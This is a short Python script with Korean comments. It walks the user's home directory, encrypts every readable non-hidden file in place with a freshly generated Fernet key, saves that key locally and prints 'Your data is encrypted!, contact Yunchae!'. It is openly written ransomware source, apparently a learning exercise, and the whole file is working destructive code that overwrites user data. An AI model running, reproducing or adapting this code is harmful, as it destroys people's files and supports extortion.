#!/usr/bin/env python3

import os

from cryptography.fernet import Fernet, InvalidToken

All_files = []  # 파일모으기
home = os.path.expanduser("~")
for root, dirs, files in os.walk(home): # /home에 있는 모든 파일이 타겟
    dirs[:] = [d for d in dirs if not d.startswith(".")]

    visible_file = [f for f in files if not f.startswith(".")]

    for thefile in visible_file:
            path = os.path.join(root,thefile)
            
            if path.endswith("encrypting.py") or path.endswith("key.key") or path.endswith("decrypting.py"):
                continue
            All_files.append(path)


print(All_files)

gen_key = Fernet.generate_key() # 키 생성

with open("key.key", "rb") as f:
    key = f.read()

with open("hello.txt", "rb") as f:
    content = f.read()

if key == b'': #만약 key.key가 비어있으면 만든 키 사용
    with open("key.key", "wb") as thekey:
        thekey.write(gen_key)
        key = gen_key

try: # 만약 전에 사용한 키로 이미 암호화된 상태 확인
    Fernet(key).decrypt(content)
    print("Already Fernet encrypted with this key")
except InvalidToken:
    
    with open("key.key", "wb") as thekey:
        thekey.write(gen_key) # 새로운 키를 key.key에 저장

    for file in All_files:
        try:  # 읽거나 적을 수 있는 권한이 있는 파일들만
            with open(file, "r+b") as thefile: 
                content = thefile.read()
        except: # 아니면 스킵
            continue

        content_encrypted = Fernet(gen_key).encrypt(content) # 내일 내용 암호화

        with open(file, "wb") as thefile: # 파일을 하나씩 열어 overwrite 하기
            thefile.write(content_encrypted)

    print("Your data is encrypted!, contact Yunchae!")

